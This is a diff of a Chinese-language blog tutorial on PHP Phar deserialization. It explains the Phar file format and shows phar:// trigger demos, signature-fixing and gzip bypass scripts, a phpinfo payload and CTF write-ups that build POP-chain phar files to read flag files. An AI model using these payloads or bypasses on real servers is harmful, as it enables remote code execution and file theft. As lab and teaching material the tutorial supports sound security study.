@@ -311,40 +311,40 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这行代码的含义，也就是说前面的内容是不限制的，但在该 PHP 语句中，必须有<code>__HALT_COMPILER()</code>，没有这个，PHP 就无法识别出它是 Phar 文件。<br>这个其实就类似于图片文件头，比如 gif 文件没有 <code>GIF89A</code> 文件头就无法正确的解析图片，010 Editor 里面的 phar 文件头如图</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/stubPic.png" class>
 
 <h4 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h4><p>a manifest describing the contents，用于存放文件的属性、权限等信息。<br>这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的 <code>Meta-data</code></p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/manifest.png" class>
 
 <p>在我们上面生成的 phar 文件中，manifest 的内容如图</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/manifestPic.png" class>
 
 <h4 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h4><p>用于存放 Phar 文件的内容</p>
 <h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p><code>[optional] a signature for verifying Phar integrity (phar file format only)</code>,签名(可选参数)，位于文件末尾，具体格式如下</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/signature.png" class>
 
 <p>从官方文档中不难看出，签证尾部的 01 代表 md5 加密，02 代表 sha1 加密，04 代表 sha256 加密，08 代表 sha512 加密</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/GBMBSignature.png" class>
 
 <p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名更换签名的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()	</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="0x02-Phar-反序列化漏洞"><a href="#0x02-Phar-反序列化漏洞" class="headerlink" title="0x02 Phar 反序列化漏洞"></a>0x02 Phar 反序列化漏洞</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Phar 反序列化之所以存在，是因为 Phar 文件中的 <code>manifest</code> 字段存储了序列化的数据，这其实就是用户的 <code>mete-data</code>，PHP 使用 <code>phar_parse_metedata()</code> 函数解析 meta 数据时，会调用 <code>php_var_unserialize()</code> 函数进行反序列化。具体解析代码如下</p>
 <p><strong>php-src&#x2F;ext&#x2F;phar&#x2F;phar.c</strong></p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/phar_parse_metadata.png" class>
 
 <p>那么该如何触发反序列化呢，一般是配合 Phar 伪协议，伪协议使用较多的是一些文件操作函数，只有这些函数能进行反序列化操作，单纯的 <code>phar://</code> 的伪协议并不能触发反序列化，如 <code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code> 等，具体如下图</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/AffectedFunctions.png" class>
 
 <p>通过两个小 demo 来证明一下 <code>file_get_contents()</code> 可用：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;the name is  &#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;   Destruct called&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tttang</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://drunkbaby.phar/test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tttang</span>;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/file_get_contentsInvoke.png" class>
 
 <p>成功触发，同样可以试一试其他的函数</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;the name is  &#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;   Destruct called&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$drunkbaby</span> = <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;phar://drunkbaby.phar/test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$drunkbaby</span>;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/file_existsInvoke.png" class>
 
 <p>这里会打印出的数据有之前在 test.txt 中写入的内容 <code>空格</code>，以及该打印出的 <code>$this-&gt;name</code> 的内容 —— drunkbaby</p>
 <p>所以此处我们可以用一种别样的方式来触发反序列化，回想一下之前 PHP 反序列化的时候，是需要一个 <code>unserialize()</code> 反序列化的入口类的，但是在 Phar 反序列化当中，这一过程更为隐蔽。</p>
@@ -364,7 +364,7 @@
 <p>正常情况下应该是会给我们提供文件上传的功能点，这里我没有写，但是可以直接利用，payload 为</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://poc.phar&amp;1=phpinfo();</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/Demo1EXP.png" class>
 
 <h2 id="0x03-Phar-反序列化-Bypass-的攻防二相性"><a href="#0x03-Phar-反序列化-Bypass-的攻防二相性" class="headerlink" title="0x03 Phar 反序列化 Bypass 的攻防二相性"></a>0x03 Phar 反序列化 Bypass 的攻防二相性</h2><h3 id="对-Phar-内文件检测白名单"><a href="#对-Phar-内文件检测白名单" class="headerlink" title="对 Phar 内文件检测白名单"></a>对 Phar 内文件检测白名单</h3><p>我们利用Phar反序列化的第一步就是需要上传Phar文件到服务器，而如果服务端存在防护，比如这种</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span></span><br></pre></td></tr></table></figure>
@@ -393,15 +393,15 @@
 <li>首先通过正常的登录注册业务进到正常的逻辑当中去，发现有个文件上传的业务点。</li>
 </ul>
 <p>上传 shell.jpeg 可以上传成功，并且存在下载与删除的业务</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/DropBox_UploadSuccess.png" class>
 
 <p>但是目前无法确定 shell.jpeg 的路径保存在何处，所以我们先看看下载的业务，这里是存在任意文件读取的漏洞的，如图</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/DropBox_DeteceAnyFile.png" class>
 
 <p>猜测路径 <code>filename=/../var/www/html/upload.php</code> 这里读取到了文件上传的源码，同样，下载和删除应该也有源码，读一下，且包含了 <code>class.php</code>，都逐一读取一遍。</p>
 <p>但是这里 <code>$_SESSION[&#39;sandbox&#39;]</code> 不知道是什么，所以并不是一道单纯的文件上传的题目。</p>
 <p>在读取 <code>class.php</code> 的时候，发现最后 <code>close()</code> 函数调用了 <code>file_get_contents()</code> 函数，这个函数我们之前提过，很有可能是一个 Phar 反序列化的题目。且题目并没有过滤 phar 后缀的文件，修改 MIME 绕过即可</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/MIMEBypassDropBox.png" class>
 
 <p>所以这里我们需要先找链子，危险函数是 <code>class.php#close()</code>，发现是 <code>download.php#echo $file-&gt;close();</code> 调用了它，所以下载处应该是对应的漏洞入口。</p>
 <ul>
@@ -414,7 +414,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Filelist</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; files = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">File</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;poc.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;poc.phar&#x27;</span>,<span class="string">&#x27;poc.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>然后 delete 的功能点直接利用</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/DropBox_Flag.png" class>
 
 <h3 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h3><ul>
 <li>不太舒服，因为要自己编辑 PHP 文件，先读取文件</li>
@@ -438,10 +438,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;poc.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">s = s.replace(<span class="string">b&#x27;3:&#123;&#x27;</span>, <span class="string">b&#x27;4:&#123;&#x27;</span>)<span class="comment">#更换属性值，绕过__wakeup</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="comment">#print(newf)</span></span><br><span class="line">newf = gzip.compress(newf) <span class="comment">#对Phar文件进行gzip压缩</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newPoc.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:<span class="comment">#更改文件后缀</span></span><br><span class="line">    file.write(newf)</span><br></pre></td></tr></table></figure>
 
 <p>构造完毕之后，上传并攻击</p>
-
+<img src="/2023/04/05/Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/nssFlag.png" class>
 
 <h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>总体感受下来 phar 的攻击面还是有点窄，不太好打</p>
-<h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link"   target="_blank" rel="noopener" href="https://quan9i.github.io/post/PHP%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/" >https://quan9i.github.io/post/PHP%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" target="_blank" rel="noopener" href="https://quan9i.github.io/post/PHP%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/">https://quan9i.github.io/post/PHP%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
